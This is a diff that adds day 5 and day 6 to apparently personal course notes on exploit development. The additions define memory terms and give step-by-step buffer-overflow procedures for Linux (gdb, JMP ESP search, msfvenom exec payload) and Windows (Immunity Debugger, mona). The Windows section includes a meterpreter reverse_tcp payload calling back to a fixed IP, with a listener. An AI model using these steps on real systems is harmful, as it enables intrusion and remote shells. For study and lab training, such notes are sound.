@@ -480,6 +480,69 @@ encryption trasport
 - scp <source> <destination>
   ncat --ssl <ip> <port> < <file>
 
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+day 5) 
+
+
+exploit development 
+-----------------------------
+Heap - Memory that can be allocated and deallocated
+Stack - A contiguous section of memory used for passing arguments
+Registers - Storage elements as close as possible to the central processing unit (CPU)
+Instruction Pointer (IP) - a.k.a Program Counter (PC), contains the address of next instruction to be executed
+Stack Pointer (SP) - Contains the address of the next available space on the stack
+Function - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
+Shellcode - The code that is executed once an exploit successfully takes advantage of a vulnerability
+
+
+
+commands 
+-----------------
+gdb ./<file> 
+info functions 
+pdisass <function i want> 
+run it with the non repeating string 
+evn - gdb ./func (finds what the memory addresses will be) 
+unset env LINES
+unset env COLUMNS
+run (crash the program) 
+info proc map
+find /b <after the heap>, <before the stack> 0xff, 0xe4 
+put the memories into the script and conver to big endian 
+msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python  (payload) 
+1) if it wants user input: <program> <<<$(./mybuff.py)  if not then <program> $(./mybuff.py)
+                                  (send the output as a variable)
+
+---------------------------------------------------------------------------------------------
+day 6) windows
+
+steps 
+-------------
+start immunity bugger 
+switch to running 
+run the script 
+get the EIP 
+go to buffer overflow pattern and get the offset 
+put it in script 
+!mona modules (in the bottom) find no priv .dll
+type this !mona jmp -r esp -m "<the dll>" 
+convert address to big endian 
+make payload :  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.41.112 lport=4444 -b "\x00" -f python 
+msfconsole: use multi/handler set payload to what we used, set lhost to 0.0.0.0 and lport to the one we used, run 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
